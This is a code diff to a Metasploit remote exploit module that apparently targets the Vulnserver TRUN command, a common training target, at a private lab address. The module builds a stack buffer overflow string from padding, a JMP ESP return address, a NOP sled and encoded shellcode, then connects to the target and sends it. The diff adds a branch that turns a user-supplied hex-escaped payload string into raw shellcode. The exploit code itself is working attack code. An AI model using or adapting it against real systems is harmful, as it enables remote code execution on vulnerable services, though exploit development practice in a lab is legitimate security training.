@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       'Privileged'     => false,
       'DefaultOptions' =>
         {
-          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
+          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done
         },
       'Payload'        =>	# How to encode and generate the payload
         {
@@ -54,12 +54,16 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
           Opt::RHOSTS('192.168.7.191'),
       ])
   end
-
   def exploit	# Actual exploit
     print_status("Connecting to target...")
     connect	# Connect to the target
 
-    shellcode = payload.encoded	# Generated and encoded shellcode
+    if datastore['PAYLOADSTR'] && !datastore['PAYLOADSTR'].empty?
+      shellcode = payload.encoded.gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
+    else
+      shellcode = payload.encoded
+    end
+
     outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + [target['jmpesp']].pack('V') + "\x90" * 32 + shellcode + "\x90" * 990 # Create the malicious string that will be sent to the target
 
     print_status("Sending Exploit")
